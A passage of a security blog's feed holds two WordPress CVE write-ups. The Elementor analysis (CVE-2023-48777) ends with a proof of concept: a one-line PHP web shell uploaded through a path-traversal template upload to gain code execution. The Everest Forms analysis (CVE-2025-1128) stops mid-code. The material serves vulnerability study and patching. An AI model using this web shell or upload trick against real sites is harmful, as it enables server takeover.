2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The template upload process uses &lt;strong&gt;Base64&lt;/strong&gt; content: the data in &lt;code&gt;$file[&#39;fileData&#39;]&lt;/code&gt; is &lt;strong&gt;decoded with&lt;/strong&gt; &lt;code&gt;base64_decode&lt;/code&gt; and assigned to &lt;code&gt;$file_content&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file_content = base64_decode( $file[&amp;#39;fileData&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After decoding, &lt;code&gt;save_base64_to_tmp_file()&lt;/code&gt; calls &lt;code&gt;create_temp_file()&lt;/code&gt; to &lt;strong&gt;save this content as a template file&lt;/strong&gt; on the server:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_temp_file( $file_content, $file_name ) {&#xA;    $temp_filename = $this-&amp;gt;create_unique_dir() . $file_name;&#xA;&#xA;    file_put_contents( $temp_filename, $file_content ); // phpcs:ignore&#xA;&#xA;    return $temp_filename;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The file path is constructed by concatenating &lt;code&gt;$file_name&lt;/code&gt; with the return value of &lt;code&gt;create_unique_dir()&lt;/code&gt; — this function creates the &lt;strong&gt;temporary template&lt;/strong&gt; storage path:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_unique_dir() {&#xA;    $unique_dir_path = $this-&amp;gt;get_temp_dir() . uniqid() . DIRECTORY_SEPARATOR;&#xA;&#xA;    wp_mkdir_p( $unique_dir_path );&#xA;&#xA;    return $unique_dir_path;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;create_unique_dir()&lt;/code&gt; is responsible for &lt;strong&gt;creating the temporary template directory&lt;/strong&gt;, with a structure like:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-content/uploads/elementor/tmp/&amp;lt;filename&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where &lt;code&gt;&amp;lt;uniqueId&amp;gt;&lt;/code&gt; is generated automatically by &lt;a href=&#34;https://www.php.net/manual/en/function.uniqid.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;uniqid()&lt;/a&gt; to ensure the path is unique. &lt;code&gt;wp_mkdir_p()&lt;/code&gt; will create the physical directory on the server to store the template.&lt;/p&gt;&#xA;&lt;p&gt;Finally &lt;code&gt;create_temp_file()&lt;/code&gt; calls &lt;code&gt;file_put_contents( $temp_filename, $file_content )&lt;/code&gt; to write the contents of &lt;code&gt;$file_content&lt;/code&gt; to &lt;code&gt;$temp_filename&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;By abusing the lack of filename sanitization here, we combine it with a path traversal attack so the file can be written to an accessible location, bypassing the randomness of &lt;code&gt;uniqid()&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_template( array $data ) {&#xA;    // If the template is a JSON file, allow uploading it.&#xA;    add_filter( &amp;#39;elementor/files/allow-file-type/json&amp;#39;, [ $this, &amp;#39;enable_json_template_upload&amp;#39; ] );&#xA;    add_filter( &amp;#39;elementor/files/allow_unfiltered_upload&amp;#39;, [ $this, &amp;#39;enable_json_template_upload&amp;#39; ] );&#xA;&#xA;    // Imported templates can be either JSON files, or Zip files containing multiple JSON files&#xA;    $upload_result = Plugin::$instance-&amp;gt;uploads_manager-&amp;gt;handle_elementor_upload( $data, [ &amp;#39;zip&amp;#39;, &amp;#39;json&amp;#39; ] );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;handle_elementor_upload()&lt;/code&gt; is called inside &lt;code&gt;import_template()&lt;/code&gt;. According to the developer comment, if the template is a JSON file it is allowed to upload. We set a debugger and perform an upload of a JSON template:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Create a post using Elementor&lt;/li&gt;&#xA;&lt;li&gt;Click the folder icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/folder_icon.png&#34; title=&#34;Folder icon location&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/folder_icon.png&#34; data-sub-html=&#34;&lt;h2&gt;Folder icon&lt;/h2&gt;&lt;p&gt;Folder icon location&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/folder_icon.png&#39; alt=&#34;Folder icon&#34; height=&#34;1113&#34; width=&#34;1440&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Folder icon location&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Click the upload icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_icon.png&#34; title=&#34;Upload icon location&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/upload_icon.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload icon&lt;/h2&gt;&lt;p&gt;Upload icon location&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_icon.png&#39; alt=&#34;Upload icon&#34; height=&#34;1113&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Upload icon location&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_board.png&#34; title=&#34;Upload interface&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/upload_board.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload board&lt;/h2&gt;&lt;p&gt;Upload interface&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/upload_board.png&#39; alt=&#34;Upload board&#34; height=&#34;818&#34; width=&#34;1309&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Upload interface&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Select a JSON file and upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/debug.gif&#34; title=&#34;Debugger jumps to import_template after uploading the JSON file&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/debug.gif&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger jumps to import_template after uploading the JSON file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/debug.gif&#39; alt=&#34;Debug&#34; height=&#34;1115&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger jumps to import_template after uploading the JSON file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;User uploads JSON file&amp;#34;] --&amp;gt; B[&amp;#34;import_template()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;handle_elementor_upload()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;save_base64_to_tmp_file()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;create_temp_file()&amp;#34;]&#xA;E --&amp;gt; G[&amp;#34;create_unique_dir()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;file_put_contents()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;File stored without proper type validation → Arbitrary File Upload&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a JSON file containing a web shell&#xA;PHP&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;])?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Upload and intercept the request using BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;Change the file extension to PHP combined with path traversal and send the request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/request.png&#34; title=&#34;Request with path traversal and .php&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request with path traversal and .php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/request.png&#39; alt=&#34;Request&#34; height=&#34;850&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request with path traversal and .php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-10-cve-2023-48777/result.png&#34; title=&#34;RCE via file upload&#34; data-thumbnail=&#34;/posts/2025-11-10-cve-2023-48777/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-10-cve-2023-48777/result.png&#39; alt=&#34;Result&#34; height=&#34;571&#34; width=&#34;1578&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2023-48777&lt;/strong&gt; vulnerability allows users with &lt;strong&gt;Contributor&lt;/strong&gt; privileges to upload malicious files due to the lack of file type validation before saving. This can lead to &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; and &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; if the server allows execution of uploaded files. The issue was patched in version &lt;strong&gt;3.18.2&lt;/strong&gt; by adding a check for allowed file extensions before writing to disk.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;validate file type before saving&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Do not trust Base64 data or file names&lt;/strong&gt; from the client.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Restrict upload permissions&lt;/strong&gt; and separate upload storage from executable locations.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elementor/vulnerability/wordpress-elementor-plugin-3-18-0-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin &amp;lt;= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-1128 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-09-cve-2025-1128/</link>
      <pubDate>Sun, 09 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-09-cve-2025-1128/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Everest Forms – Contact Forms, Quiz, Survey, Newsletter &amp;amp; Payment Form Builder&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; is vulnerable to &lt;strong&gt;arbitrary file upload, read, and deletion&lt;/strong&gt; due to missing &lt;strong&gt;file type&lt;/strong&gt; and &lt;strong&gt;path validation&lt;/strong&gt; in the &lt;code&gt;format&lt;/code&gt; method of the &lt;code&gt;EVF_Form_Fields_Upload&lt;/code&gt; class in all versions up to and including &lt;strong&gt;3.0.9.4&lt;/strong&gt;. This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to &lt;strong&gt;upload, read, and delete arbitrary files&lt;/strong&gt; on the affected site’s server, potentially leading to &lt;strong&gt;remote code execution&lt;/strong&gt;, &lt;strong&gt;sensitive information disclosure&lt;/strong&gt;, or &lt;strong&gt;site takeover&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-1128&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-1128&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.0.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.0.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/everest-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Everest Forms&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.0.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.0.9.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool of your choice.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;This vulnerability is caused by insufficient validation of file types and file paths in the &lt;code&gt;format&lt;/code&gt; method of the &lt;code&gt;EVF_Form_Fields_Upload&lt;/code&gt; class. Even when a file is of an invalid type, the upload flow can continue; by modifying parts of the submitted data/communication, server-side validation can be bypassed.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, 